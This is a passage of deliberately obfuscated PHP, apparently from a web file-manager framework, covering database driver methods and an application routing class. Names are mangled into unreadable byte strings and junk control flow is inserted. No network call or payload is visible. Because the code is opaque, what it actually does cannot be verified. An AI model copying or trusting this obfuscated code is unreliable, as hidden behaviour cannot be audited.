!1; } $this->queryStr = $ƒ’¡é¤Ù; if (!empty($Ø›¸¼ğÃ)) { $this->queryStr .= $¥¯¡®ŞŞ[967] . print_r($Ø›¸¼ğÃ, !0) . $¥¯¡®ŞŞ[968]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¥¯¡®ŞŞ[33], 1); think_status($¥¯¡®ŞŞ[34]); $this->PDOStatement = $this->_linkID->prepare($ƒ’¡é¤Ù); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¨¨¬İó¿ = $this->PDOStatement->execute($Ø›¸¼ğÃ); $this->debug(); if (!1 === $¨¨¬İó¿) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¶¤«±Åè, $€ÁŞ—Ùú = array()) { $êù£Ì‘³ =& $_SERVER[•€áå–Õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¶¤«±Åè; if (!empty($€ÁŞ—Ùú)) { $this->queryStr .= $êù£Ì‘³[967] . print_r($€ÁŞ—Ùú, !0) . $êù£Ì‘³[968]; } $şÓà‹ÚÈ = !1; if ($this->dbType == $êù£Ì‘³[961]) { if (preg_match($êù£Ì‘³[969], $this->queryStr, $¶óûá˜)) { $this->table = think_config($êù£Ì‘³[970]) . str_ireplace(think_config($êù£Ì‘³[971]), $êù£Ì‘³[433], $¶óûá˜[2]); $şÓà‹ÚÈ = (bool) $this->query($êù£Ì‘³[972] . strtoupper($this->table) . $êù£Ì‘³[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($êù£Ì‘³[35], 1); think_status($êù£Ì‘³[34]); $this->PDOStatement = $this->_linkID->prepare($¶¤«±Åè); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ï“‘’åÁ = $this->PDOStatement->execute($€ÁŞ—Ùú); $this->debug(); if (!1 === $Ï“‘’åÁ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($şÓà‹ÚÈ || preg_match($êù£Ì‘³[973], $¶¤«±Åè)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÉêÌ—æä = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÉêÌ—æä) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $í˜ŞÇõİ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$í˜ŞÇõİ) { $this->error(); return !1; } } return !0; } private function getAll() { $íœéè÷ä = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($íœéè÷ä); return $íœéè÷ä; } public function getFields($Ãœ›Ä™õ) { $ ˆˆ¶° =& $_SERVER[•€áå–Õ]; $this->initConnect(!0); if (think_config($ ˆˆ¶°[974])) { $…ÙÉï†¥ = str_replace($ ˆˆ¶°[975], $Ãœ›Ä™õ, think_config($ ˆˆ¶°[974])); } else { switch ($this->dbType) { case $ ˆˆ¶°[958]: case $ ˆˆ¶°[976]: $…ÙÉï†¥ = "\x53\x45\114\x45\103\x54\40\40\40\143\157\x6c\x75\155\x6e\x5f\x6e\x61\155\x65\x20\141\x73\x20\x27\x4e\141\x6d\x65\x27\54\40\40\40\144\141\164\x61\137\164\x79\160\145\40\141\163\40\x27\124\171\x70\145\x27\x2c\40\x20\x20\143\x6f\x6c\x75\x6d\x6e\137\144\x65\x66\x61\165\x6c\164\40\x61\x73\40\x27\x44\x65\x66\x61\x75\154\164\x27\x2c\40\x20\40\151\x73\x5f\x6e\165\x6c\x6c\x61\x62\154\145\40\141\163\x20\x27\x4e\x75\x6c\x6c\47\xa\x9\x9\106\x52\x4f\x4d\11\x69\156\x66\157\x72\x6d\141\x74\x69\157\156\x5f\x73\x63\150\x65\155\141\x2e\x74\x61\x62\154\145\163\x20\x41\x53\40\164\12\x9\x9\112\x4f\111\x4e\11\x69\x6e\x66\x6f\x72\x6d\141\164\151\x6f\156\x5f\x73\143\150\145\x6d\x61\56\143\x6f\154\165\155\156\163\40\101\x53\40\143\xa\x9\x9\117\116\x20\40\164\56\x74\141\142\154\x65\137\x63\141\164\x61\x6c\x6f\147\40\x3d\x20\x63\x2e\x74\141\x62\154\x65\x5f\x63\141\x74\x61\x6c\x6f\x67\xa\11\x9\x41\x4e\104\40\x74\56\164\x61\x62\x6c\145\x5f\163\143\x68\145\155\x61\x20\75\40\x63\x2e\164\x61\x62\154\145\137\x73\143\x68\x65\x6d\141\xa\x9\11\101\x4e\104\40\164\56\164\x61\x62\154\145\x5f\156\x61\x6d\x65\40\75\x20\x63\56\164\x61\x62\154\145\x5f\156\x61\x6d\x65\xa\11\x9\127\x48\x45\122\105\x20\40\40\164\x2e\x74\141\142\x6c\145\137\x6e\x61\155\x65\40\75\x20\47{$Ãœ›Ä™õ}\x27"; break; case $ ˆˆ¶°[977]: $…ÙÉï†¥ = $ ˆˆ¶°[978] . $Ãœ›Ä™õ . $ ˆˆ¶°[979]; break; case $ ˆˆ¶°[959]: case $ ˆˆ¶°[961]: $…ÙÉï†¥ = $ ˆˆ¶°[980] . $ ˆˆ¶°[981] . $ ˆˆ¶°[982] . strtoupper($Ãœ›Ä™õ) . $ ˆˆ¶°[983] . strtoupper($Ãœ›Ä™õ) . $ ˆˆ¶°[984]; break; case $ ˆˆ¶°[985]: $…ÙÉï†¥ = $ ˆˆ¶°[986] . $Ãœ›Ä™õ . $ ˆˆ¶°[987]; break; case $ ˆˆ¶°[960]: break; case $ ˆˆ¶°[988]: default: $…ÙÉï†¥ = $ ˆˆ¶°[989] . ($this->dbType == $ ˆˆ¶°[988] ? "\140{$Ãœ›Ä™õ}\140" : $Ãœ›Ä™õ); } } $é†çş‰² = $this->query($…ÙÉï†¥); $šÜéÑËï = array(); if ($é†çş‰²) { foreach ($é†çş‰² as $ŞØ¼ø¾ê => $‰œÀ·®‘) { $‰œÀ·®‘ = array_change_key_case($‰œÀ·®‘); $‰œÀ·®‘[$ ˆˆ¶°[42]] = isset($‰œÀ·®‘[$ ˆˆ¶°[42]]) ? $‰œÀ·®‘[$ ˆˆ¶°[42]] : $ ˆˆ¶°[433]; $‰œÀ·®‘[$ ˆˆ¶°[43]] = isset($‰œÀ·®‘[$ ˆˆ¶°[43]]) ? $‰œÀ·®‘[$ ˆˆ¶°[43]] : $ ˆˆ¶°[433]; $ï‹àš˜º = isset($‰œÀ·®‘[$ ˆˆ¶°[328]]) ? $‰œÀ·®‘[$ ˆˆ¶°[328]] : $‰œÀ·®‘[$ ˆˆ¶°[42]]; $šÜéÑËï[$ï‹àš˜º] = array($ ˆˆ¶°[42] => $ï‹àš˜º, $ ˆˆ¶°[43] => $‰œÀ·®‘[$ ˆˆ¶°[43]], $ ˆˆ¶°[45] => (bool) (isset($‰œÀ·®‘[$ ˆˆ¶°[115]]) && $‰œÀ·®‘[$ ˆˆ¶°[115]] === $ ˆˆ¶°[22] || isset($‰œÀ·®‘[$ ˆˆ¶°[45]]) && $‰œÀ·®‘[$ ˆˆ¶°[45]] === $ ˆˆ¶°[22]), $ ˆˆ¶°[47] => isset($‰œÀ·®‘[$ ˆˆ¶°[47]]) ? $‰œÀ·®‘[$ ˆˆ¶°[47]] : (isset($‰œÀ·®‘[$ ˆˆ¶°[66]]) ? $‰œÀ·®‘[$ ˆˆ¶°[66]] : $ ˆˆ¶°[433]), $ ˆˆ¶°[49] => isset($‰œÀ·®‘[$ ˆˆ¶°[106]]) ? strtolower($‰œÀ·®‘[$ ˆˆ¶°[106]]) == $ ˆˆ¶°[51] : (isset($‰œÀ·®‘[$ ˆˆ¶°[67]]) ? $‰œÀ·®‘[$ ˆˆ¶°[67]] : !1), $ ˆˆ¶°[52] => isset($‰œÀ·®‘[$ ˆˆ¶°[990]]) ? strtolower($‰œÀ·®‘[$ ˆˆ¶°[990]]) == $ ˆˆ¶°[54] : (isset($‰œÀ·®‘[$ ˆˆ¶°[106]]) ? $‰œÀ·®‘[$ ˆˆ¶°[106]] : !1)); } } return $šÜéÑËï; } public function getTables($å„œÎøì = '') { $£µêªç =& $_SERVER[•€áå–Õ]; if (think_config($£µêªç[991])) { $È¥ÕÊÎ” = str_replace($£µêªç[992], $å„œÎøì, think_config($£µêªç[991])); } else { switch ($this->dbType) { case $£µêªç[959]: case $£µêªç[961]: $È¥ÕÊÎ” = $£µêªç[993]; break; case $£µêªç[958]: case $£µêªç[976]: $È¥ÕÊÎ” = $£µêªç[994]; break; case $£µêªç[985]: $È¥ÕÊÎ” = $£µêªç[995]; break; case $£µêªç[960]: think_exception(think_lang($£µêªç[996]) . $£µêªç[997]); break; case $£µêªç[977]: $È¥ÕÊÎ” = $£µêªç[55] . $£µêªç[56] . $£µêªç[57]; break; case $£µêªç[988]: default: if (!empty($å„œÎøì)) { $È¥ÕÊÎ” = $£µêªç[940] . $å„œÎøì . $£µêªç[941]; } else { $È¥ÕÊÎ” = $£µêªç[942]; } } } $‘òİ¯ = $this->query($È¥ÕÊÎ”); $½¸îş–… = array(); foreach ($‘òİ¯ as $ÕğÀ÷ûÚ => $³¯ÒõÄš) { $½¸îş–…[$ÕğÀ÷ûÚ] = current($³¯ÒõÄš); } return $½¸îş–…; } protected function parseLimit($„÷İ§ƒ) { $ ü¹ù’º =& $_SERVER[•€áå–Õ]; $Í‰æ“¢‡ = $ ü¹ù’º[22]; if (!empty($„÷İ§ƒ)) { switch ($this->dbType) { case $ ü¹ù’º[985]: case $ ü¹ù’º[977]: $„÷İ§ƒ = explode($ ü¹ù’º[60], $„÷İ§ƒ); if (count($„÷İ§ƒ) > 1) { $Í‰æ“¢‡ .= $ ü¹ù’º[61] . $„÷İ§ƒ[1] . $ ü¹ù’º[62] . $„÷İ§ƒ[0] . $ ü¹ù’º[63]; } else { $Í‰æ“¢‡ .= $ ü¹ù’º[61] . $„÷İ§ƒ[0] . $ ü¹ù’º[63]; } break; case $ ü¹ù’º[958]: case $ ü¹ù’º[976]: break; case $ ü¹ù’º[960]: break; case $ ü¹ù’º[959]: case $ ü¹ù’º[961]: break; case $ ü¹ù’º[988]: default: $Í‰æ“¢‡ .= $ ü¹ù’º[61] . $„÷İ§ƒ . $ ü¹ù’º[63]; } } return $Í‰æ“¢‡; } public function parseKey(&$Ê„²¤¡¶, $ÇºÕÅ¿ = true) { $Ü‰¡¢ûç =& $_SERVER[•€áå–Õ]; if ($ÇºÕÅ¿) { $Ê„²¤¡¶ = $this->parseKeyCheck($Ê„²¤¡¶); } if ($this->dbType == $Ü‰¡¢ûç[988]) { if ($Ê„²¤¡¶ != $Ü‰¡¢ûç[215] && !preg_match($Ü‰¡¢ûç[952], $Ê„²¤¡¶)) { $Ê„²¤¡¶ = $Ü‰¡¢ûç[440] . trim($Ê„²¤¡¶, $Ü‰¡¢ûç[440]) . $Ü‰¡¢ûç[440]; } return $Ê„²¤¡¶; } else { return parent::parseKey($Ê„²¤¡¶, $ÇºÕÅ¿); } } public function close() { $this->_linkID = null; } public function error() { $«ŠšŸ¬ =& $_SERVER[•€áå–Õ]; if ($this->PDOStatement) { $¡„¿Î®Ä = $this->PDOStatement->errorInfo(); $this->error = $¡„¿Î®Ä[1] . $«ŠšŸ¬[4] . $¡„¿Î®Ä[2]; } else { $this->error = $«ŠšŸ¬[22]; } if ($«ŠšŸ¬[22] != $this->queryStr) { $this->error .= LNG($«ŠšŸ¬[58]) . $this->queryStr; } think_trace($this->error, $«ŠšŸ¬[22], $«ŠšŸ¬[59]); return $this->error; } public function escapeString($àşñçùµ) { $¹ê—Üâª =& $_SERVER[•€áå–Õ]; switch ($this->dbType) { case $¹ê—Üâª[985]: case $¹ê—Üâª[958]: case $¹ê—Üâª[976]: case $¹ê—Üâª[988]: return addslashes($àşñçùµ); case $¹ê—Üâª[960]: case $¹ê—Üâª[977]: case $¹ê—Üâª[959]: case $¹ê—Üâª[961]: return str_ireplace($¹ê—Üâª[68], $¹ê—Üâª[69], $àşñçùµ); } } protected function parseValue($êşÕ  ƒ) { $Û¾‘‚Æâ =& $_SERVER[•€áå–Õ]; if (is_string($êşÕ  ƒ)) { $Òñ¹Ñ´ = strpos($êşÕ  ƒ, $Û¾‘‚Æâ[4]) === 0 && in_array($êşÕ  ƒ, array_keys($this->bind)); $êşÕ  ƒ = $Òñ¹Ñ´ ? $this->escapeString($êşÕ  ƒ) : $Û¾‘‚Æâ[998] . $this->escapeString($êşÕ  ƒ) . $Û¾‘‚Æâ[998]; } elseif (isset($êşÕ  ƒ[0]) && is_string($êşÕ  ƒ[0]) && strtolower($êşÕ  ƒ[0]) == $Û¾‘‚Æâ[352]) { $êşÕ  ƒ = $this->escapeString($êşÕ  ƒ[1]); } elseif (is_array($êşÕ  ƒ)) { $êşÕ  ƒ = array_map(array($this, $Û¾‘‚Æâ[999]), $êşÕ  ƒ); } elseif (is_bool($êşÕ  ƒ)) { $êşÕ  ƒ = $êşÕ  ƒ ? $Û¾‘‚Æâ[100] : $Û¾‘‚Æâ[224]; } elseif (is_null($êşÕ  ƒ)) { $êşÕ  ƒ = $Û¾‘‚Æâ[115]; } return $êşÕ  ƒ; } public function getLastInsertId() { $Î©şèÊÜ =& $_SERVER[•€áå–Õ]; switch ($this->dbType) { case $Î©şèÊÜ[985]: case $Î©şèÊÜ[977]: case $Î©şèÊÜ[958]: case $Î©şèÊÜ[976]: case $Î©şèÊÜ[960]: case $Î©şèÊÜ[988]: return $this->_linkID->lastInsertId(); case $Î©şèÊÜ[959]: case $Î©şèÊÜ[961]: $µÜ¼Œî¢ = $this->table; $Ò¬´ıÙ¶ = $this->query("\123\105\x4c\x45\x43\x54\x20{$µÜ¼Œî¢}\x2e\x63\165\x72\x72\x76\141\x6c\x20\143\165\x72\x72\x76\141\154\x20\x46\x52\117\115\x20\144\x75\141\x6c"); return $Ò¬´ıÙ¶ ? $Ò¬´ıÙ¶[0][$Î©şèÊÜ[1000]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÙîåÆ¶Ÿ) { $ËÕôÙ˜³ =& $_SERVER[•€áå–Õ]; if (!CacheLock::fileLock($ËÕôÙ˜³[23])) { return !1; } $ Ì¾“ = parent::query($ÙîåÆ¶Ÿ); CacheLock::fileUnLock($ËÕôÙ˜³[23]); return $ Ì¾“; } public function execute($âïı¿ï) { $˜ïÓÍ =& $_SERVER[•€áå–Õ]; if (!CacheLock::fileLock($˜ïÓÍ[23])) { return !1; } $‹€òàƒÓ = parent::execute($âïı¿ï); CacheLock::fileUnLock($˜ïÓÍ[23]); return $‹€òàƒÓ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ÉÈÜòú) { $Îšà¸Ş¦ =& $_SERVER[•€áå–Õ]; if (!CacheLock::fileLock($Îšà¸Ş¦[23])) { return !1; } $áÆĞöÖÁ = parent::query($ÉÈÜòú); CacheLock::fileUnLock($Îšà¸Ş¦[23]); return $áÆĞöÖÁ; } public function execute($¨¢®Ÿ¢ß) { $º™ù¢á² =& $_SERVER[•€áå–Õ]; if (!CacheLock::fileLock($º™ù¢á²[23])) { return !1; } $ÈÏ™äÄÖ = parent::execute($¨¢®Ÿ¢ß); CacheLock::fileUnLock($º™ù¢á²[23]); return $ÈÏ™äÄÖ; } } goto d×äğ³³Úö; Däï¬‘…²: class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($­©•ö÷Ğ) { $¥…ÓÅ¦— =& $_SERVER[•€áå–Õ]; $Ã½äÂÈ— =& $_SERVER[ÛóøÜ¾æ]; $üø®¼Â = explode($Ã½äÂÈ—[0], trim($­©•ö÷Ğ, $Ã½äÂÈ—[0])); $›âÚ²¨ = $¥…ÓÅ¦—[662]; $this->defaultModule = $üø®¼Â[0] ? $üø®¼Â[0] : $this->defaultModule; $äÓ…û®× = $¥…ÓÅ¦—[663]; if (strlen($äÓ…û®×) < $¥…ÓÅ¦—[13]) { die; } $this->defaultController = $üø®¼Â[1] ? $üø®¼Â[1] : $this->defaultController; $ÜÈç¤«Õ = $¥…ÓÅ¦—[664]; $this->defaultAction = $üø®¼Â[2] ? $üø®¼Â[2] : $this->defaultAction; $ƒ½·¨¹¯ = $¥…ÓÅ¦—[665]; if (strlen($ƒ½·¨¹¯) < $¥…ÓÅ¦—[666]) { return; } $this->sqjx86273145($Ã½äÂÈ—[1], array($this, $Ã½äÂÈ—[2])); $œ¿×ÆÁº = $¥…ÓÅ¦—[667]; if (strlen($œ¿×ÆÁº) < $¥…ÓÅ¦—[666]) { die; } } public function appRun($Œ‹õ§ßŠ) { $ç²ÂÆ™ =& $_SERVER[•€áå–Õ]; $°Î„ĞÛ =& $_SERVER[ÛóøÜ¾æ]; $µ¾©Ã†í = explode($°Î„ĞÛ[0], $Œ‹õ§ßŠ); $©ç¡—Ï¥ = $ç²ÂÆ™[668]; if (!$©ç¡—Ï¥) { return; } $¯âõ”ÛÕ = strtolower($µ¾©Ã†í[0]); $øå”ø±Ë = $ç²ÂÆ™[669]; if (strlen($øå”ø±Ë) < $ç²ÂÆ™[670]) { return; } $Ò¶Ó‹¢ = $°Î„ĞÛ[3]; if ($¯âõ”ÛÕ == $°Î„ĞÛ[4]) { $Ò¶Ó‹¢ = $°Î„ĞÛ[5]; $µ¾©Ã†í[0] = $°Î„ĞÛ[6]; $µ¾©Ã†í[1] = $µ¾©Ã†í[1] . $°Î„ĞÛ[7]; $Œ‹õ§ßŠ = join($°Î„ĞÛ[0], $µ¾©Ã†í); $Œ‹õ§ßŠ = trim($Œ‹õ§ßŠ, $°Î„ĞÛ[0]); } call_user_func(array($°Î„ĞÛ[8], $°Î„ĞÛ[9]), $Ò¶Ó‹¢ . $°Î„ĞÛ[10], $Œ‹õ§ßŠ); ActionCall($Œ‹õ§ßŠ); call_user_func(array($°Î„ĞÛ[8], $°Î„ĞÛ[9]), $Ò¶Ó‹¢ . $°Î„ĞÛ[11], $Œ‹õ§ßŠ); $äñèüíÒ = $ç²ÂÆ™[671]; if (!$äñèüíÒ) { die; } } private function autorun() { $ŒŞ¿Ìê‘ =& $_SERVER[•€áå–Õ]; $›ÈÇ’” =& $_SERVER[ÛóøÜ¾æ]; global $config; $¨úìÜğ¸ = $ŒŞ¿Ìê‘[672]; while ($¨úìÜğ¸ < $ŒŞ¿Ìê‘[673]) { if ($¨úìÜğ¸ >= 0) { break; } $¨úìÜğ¸++; } if (count($config[$›ÈÇ’”[12]]) == 0) { return; } foreach ($config[$›ÈÇ’”[12]] as $İİ¸àñ› => $Ïøê¿£ë) { $this->appRun($Ïøê¿£ë); $ÂñìŒÒ› = $ŒŞ¿Ìê‘[674]; if (strlen($ÂñìŒÒ›) < $ŒŞ¿Ìê‘[670]) { die; } } } private function tocd50b32928() { $ Ù”ù =& $_SERVER[•€áå–Õ]; $¶Ü’›Û =& $_SERVER[ÛóøÜ¾æ]; $´†™Şä« = $¶Ü’›Û[4]; $ü¾¬ñÜÖ = $GLOBALS[$¶Ü’›Û[13]][$¶Ü’›Û[14]][0]; if (!$ü¾¬ñÜÖ || strlen($ü¾¬ñÜÖ) <= strlen($´†™Şä«)) { return; } if (strtolower(substr($ü¾¬ñÜÖ, -strlen($´†™Şä«))) != $´†™Şä«) { return; } $ÉÆ”ºÚ = substr($ü¾¬ñÜÖ, 0, -strlen($´†™Şä«)); $ÔÜÈ­Ï = $ Ù”ù[675]; $øÁÊ›ßÆ = array($¶Ü’›Û[4], $ÉÆ”ºÚ); $Øó¡½·ü = array_slice($GLOBALS[$¶Ü’›Û[13]][$¶Ü’›Û[14]], 1); $ùÎÃÍƒš = $ Ù”ù[676]; while ($ùÎÃÍƒš < $ Ù”ù[677]) { if ($ùÎÃÍƒš >= 0) { break; } $ùÎÃÍƒš++; } $GLOBALS[$¶Ü’›Û[13]][$¶Ü’›Û[14]] = array_merge($øÁÊ›ßÆ, $Øó¡½·ü); $GLOBALS[$¶Ü’›Û[13]][$¶Ü’›Û[15]] = implode($¶Ü’›Û[0], $GLOBALS[$¶Ü’›Û[13]][$¶Ü’›Û[14]]); $ô–ô–ç = $ Ù”ù[678]; if (strlen($ô–ô–ç) < $ Ù”ù[13]) { return; } } private function ygnhbb745c9e() { $ÏÏ›×å¡ =& $_SERVER[•€áå–Õ]; $”ï¾Í™ =& $_SERVER[ÛóøÜ¾æ]; if ($GLOBALS[$”ï¾Í™[13]][$”ï¾Í™[15]] != $”ï¾Í™[6]) { return; } $ÛÄºØä = $_SERVER[$”ï¾Í™[16]]; $üÙ³îò = $”ï¾Í™[17]; if (!strstr($ÛÄºØä, $üÙ³îò)) { return; } $ŠŒ¬¨Îá = strrpos($ÛÄºØä, $üÙ³îò); $‘Ì¬Ôëš = $ÏÏ›×å¡[679]; if (!$‘Ì¬Ôëš) { return; } $¿–¬§¼ = substr($ÛÄºØä, $ŠŒ¬¨Îá + strlen($üÙ³îò)); $çù„¬‹ = $ÏÏ›×å¡[680]; if (!$çù„¬‹) { die; } preg_match_all($”ï¾Í™[18], $¿–¬§¼, $™×÷À‰Ü); $ËàªÓÚ­ = $ÏÏ›×å¡[681]; if (!$ËàªÓÚ­) { die; } $¿–¬§¼ = trim($™×÷À‰Ü[0][0], $”ï¾Í™[19]); $Ü«ùúşˆ = $ÏÏ›×å¡[682]; if (strlen($Ü«ùúşˆ) < $ÏÏ›×å¡[673]) { die; } $GLOBALS[$”ï¾Í™[13]][$”ï¾Í™[14]] = explode($”ï¾Í™[19], $¿–¬§¼); $É¸ßŸ¨ = $ÏÏ›×å¡[683]; $GLOBALS[$”ï¾Í™[13]][$”ï¾Í™[15]] = implode($”ï¾Í™[0], $GLOBALS[$”ï¾Í™[13]][$”ï¾Í™[14]]); } public function run() { $Äôµ‚Ä =& $_SERVER[•€áå–Õ]; $øò–¼Í¦ =& $_SERVER[ÛóøÜ¾æ]; $this->ygnhbb745c9e(); $this->tocd50b32928(); $Ü´“Ô¬ = $GLOBALS[$øò–¼Í¦[13]][$øò–¼Í¦[14]]; $ã¤ºñ¢œ = $GLOBALS[$øò–¼Í¦[13]][$øò–¼Í¦[15]]; define($øò–¼Í¦[20], isset($Ü´“Ô¬[0]) && $Ü´“Ô¬[0] ? $Ü´“Ô¬[0] : $this->defaultModule); define($øò–¼Í¦[21], isset($Ü´“Ô¬[1]) && $Ü´“Ô¬[0] ? $Ü´“Ô¬[1] : $this->defaultController); define($øò–¼Í¦[22], isset($Ü´“Ô¬[2]) && $Ü´“Ô¬[0] ? $Ü´“Ô¬[2] : $this->defaultAction); define($øò–¼Í¦[23], MOD . $øò–¼Í¦[0] . ST . $øò–¼Í¦[0] . ACT); $øıî«Î = $Äôµ‚Ä[684]; while ($øıî«Î < $Äôµ‚Ä[673]) { if ($øıî«Î >= 0) { break; } $øıî«Î++; } $_SERVER[$øò–¼Í¦[24]] = strtolower(ACTION); $õ§Œ‰Â = $Äôµ‚Ä[685]; if (strlen($õ§Œ‰Â) < $Äôµ‚Ä[677]) { die; } $this->autorun(); $ÁÖÌ”›ı = $Äôµ‚Ä[686]; if (!$ÁÖÌ”›ı) { return; } if (count($Ü´“Ô¬) >= 3) { $this->appRun($ã¤ºñ¢œ); } else { $this->appRun(ACTION); } } private $tuxa87148a27 = array(); private $fmzt8802220f = ''; public function elyi74331158() { $ü—ƒ©¡¯ =& $_SERVER[•€áå–Õ]; $ù£æ£Ïº =& $_SERVER[ÛóøÜ¾æ]; $this->gcxicd23f042(); $¥ïÌ¨¿ = $ü—ƒ©¡¯[687]; if (strlen($¥ïÌ¨¿) < $ü—ƒ©¡¯[13]) { return; } $this->gkrp13d37d54(); $¶£ı³¨ñ = $ü—ƒ©¡¯[688]; while (strlen($¶£ı³¨ñ) < $ü—ƒ©¡¯[13]) { if (!$¶£ı³¨ñ) { break; } $¶£ı³¨ñ++; } $this->gexs4834d7f3(); $Õ²˜¸Ş = $ü—ƒ©¡¯[689]; if (strlen($Õ²˜¸Ş) < $ü—ƒ©¡¯[677]) { return; } $this->iaxea7b5ced6(); $€Î’å = $ü—ƒ©¡¯[690]; while (strlen($€Î’å) < $ü—ƒ©¡¯[13]) { if (!$€Î’å) { break; } $€Î’å++; } $this->mywea0400cc4(); $this->gdizdf684c85(); $ğÕò÷¯ = $ü—ƒ©¡¯[691]; if (strlen($ğÕò÷¯) < $ü—ƒ©¡¯[13]) { return; } $this->lqag23fd3e72(); $Ô ×ªÆè = $ü—ƒ©¡¯[692]; $this->sqjx86273145($ù£æ£Ïº[25], array($this, $ù£æ£Ïº[26])); $this->sqjx86273145($ù£æ£Ïº[27], array($this, $ù£æ£Ïº[28])); $this->sqjx86273145($ù£æ£Ïº[29], array($this, $ù£æ£Ïº[30])); $this->sqjx86273145($ù£æ£Ïº[31], array($this, $ù£æ£Ïº[32])); $¿Ş•Ğ€¦ = $ü—ƒ©¡¯[693]; while ($¿Ş•Ğ€¦ < $ü—ƒ©¡¯[670]) { if ($¿Ş•Ğ€¦ >= 0) { break; } $¿Ş•Ğ€¦++; } } public function flbo52c86839($È·¸İ¯) { $ŒƒğÑâ„ =& $_SERVER[•€áå–Õ]; $ìŞªÍƒ´ =& $_SERVER[ÛóøÜ¾æ]; $í“¡ğˆÆ = Model($ìŞªÍƒ´[33])->get(); $‘´âæŠ = array($ìŞªÍƒ´[34], $ìŞªÍƒ´[35], $ìŞªÍƒ´[36], $ìŞªÍƒ´[37], $ìŞªÍƒ´[38], $ìŞªÍƒ´[39], $ìŞªÍƒ´[40], $ìŞªÍƒ´[41], $ìŞªÍƒ´[42], $ìŞªÍƒ´[43], $ìŞªÍƒ´[44], $ìŞªÍƒ´[45], $ìŞªÍƒ´[46], $ìŞªÍƒ´[47], $ìŞªÍƒ´[48], $ìŞªÍƒ´[49], $ìŞªÍƒ´[50], $ìŞªÍƒ´[51], $ìŞªÍƒ´[52], $ìŞªÍƒ´[53], $ìŞªÍƒ´[54], $ìŞªÍƒ´[55], $ìŞªÍƒ´[56], $ìŞªÍƒ´[57], $ìŞªÍƒ´[58], $ìŞªÍƒ´[59], $ìŞªÍƒ´[60], $ìŞªÍƒ´[61], $ìŞªÍƒ´[62], $ìŞªÍƒ´[63], $ìŞªÍƒ´[64], $ìŞªÍƒ´[65], $ìŞªÍƒ´[66], $ìŞªÍƒ´[67], $ìŞªÍƒ´[68], $ìŞªÍƒ´[69], $ìŞªÍƒ´[70], $ìŞªÍƒ´[71], $ìŞªÍƒ´[72], $ìŞªÍƒ´[73], $ìŞªÍƒ´[74], $ìŞªÍƒ´[75], $ìŞªÍƒ´[76], $ìŞªÍƒ´[77], $ìŞªÍƒ´[78], $ìŞªÍƒ´[79], $ìŞªÍƒ´[80], $ìŞªÍƒ´[81], $ìŞªÍƒ´[82], $ìŞªÍƒ´[83], $ìŞªÍƒ´[84]); foreach ($‘´âæŠ as $ÎÑäãÔ†) { $úáûËÃ = $GLOBALS[$ìŞªÍƒ´[85]][$ìŞªÍƒ´[86]][$ÎÑäãÔ†]; if (isset($í“¡ğˆÆ[$ÎÑäãÔ†])) { $úáûËÃ = $í“¡ğˆÆ[$ÎÑäãÔ†]; } $È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[88]][$ÎÑäãÔ†] = $úáûËÃ; } $’ÂúêØ– = $È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[88]][$ìŞªÍƒ´[46]]; unset($È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[89]][$ìŞªÍƒ´[90]]); unset($È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[89]][$ìŞªÍƒ´[91]]); unset($È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[88]][$ìŞªÍƒ´[46]]); $ö¼ÌÑ·ˆ = $ŒƒğÑâ„[694]; unset($È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[88]][$ìŞªÍƒ´[92]]); $ÙÙŒûˆÖ = $ŒƒğÑâ„[695]; if (!$ÙÙŒûˆÖ) { return; } $È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[88]][$ìŞªÍƒ´[93]] = array($ìŞªÍƒ´[94] => (int) $’ÂúêØ–[$ìŞªÍƒ´[95]], $ìŞªÍƒ´[96] => (int) _get($’ÂúêØ–, $ìŞªÍƒ´[97], 0)); $¦¯ìûş× = $ŒƒğÑâ„[696]; if (strlen($¦¯ìûş×) < $ŒƒğÑâ„[666]) { return; } $…¢ÆŒÖ¸ = substr(md5($ìŞªÍƒ´[98] . get_client_ip() . $í“¡ğˆÆ[$ìŞªÍƒ´[99]]), 0, 15); $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[101]] = Mcrypt::encode(Session::sign(), $…¢ÆŒÖ¸, 3600 * 24); $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[102]] = Action($ìŞªÍƒ´[103])->accessToken(); $ÔğÑÂ¹ = $ŒƒğÑâ„[697]; if (!$ÔğÑÂ¹) { return; } $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[104]] = md5($_SERVER[$ìŞªÍƒ´[105]] . $í“¡ğˆÆ[$ìŞªÍƒ´[99]]); $üáÔÖÓ¢ = $ŒƒğÑâ„[698]; if (strlen($üáÔÖÓ¢) < $ŒƒğÑâ„[670]) { die; } $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[106]] = base64_encode(serverInfo()); $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[107]] = $this->fmzt8802220f; if ($í“¡ğˆÆ[$ìŞªÍƒ´[107]] != 